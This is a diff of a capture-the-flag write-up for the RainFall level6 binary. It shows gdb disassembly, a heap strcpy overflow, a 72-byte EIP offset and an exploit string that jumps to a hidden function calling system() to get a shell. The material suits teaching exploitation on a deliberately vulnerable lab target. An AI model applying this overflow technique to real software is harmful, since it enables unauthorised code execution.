@@ -37,7 +37,7 @@ level6@RainFall:~$ gdb -q level6
 ...
    0x08048475 <+13>:	call   0x8048360 <puts@plt>   ; write "Nope"
 ```
-But we also find a similar uncalled function ```n``` which calls ```system()```.
+But we also find a similar uncalled function ```n``` which calls ```system()```, opening a shell and showing the password.
 ```
 (gdb) info functions
 ...
@@ -48,7 +48,9 @@ But we also find a similar uncalled function ```n``` which calls ```system()```.
    0x08048461 <+13>:	call   0x8048370 <system@plt>
 ```
 strcpy() copies argv[1] to a 64 byte buffer on the heap.
-Let's try to overflow this buffer and overwrite ```eip``` with the address of ```n```.
+
+Let's try to overflow this buffer and overwrite ```eip``` with the address of ```n```, thereby jump to executing ```n```.
+
 First, using the following example with [this EIP offset tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), we find the EIP offset is 72.
 ```
 (gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
@@ -57,7 +59,7 @@ First, using the following example with [this EIP offset tool](https://projects.
 ```
 So we build our exploit string:
 1. 72 bytes padding
-2. address of ```n``` (4 bytes) - "\x54\x84\x04\x08"
+2. address of ```n``` - "\x54\x84\x04\x08"
 
 Then give the exploit string as argument to the binary
 ```
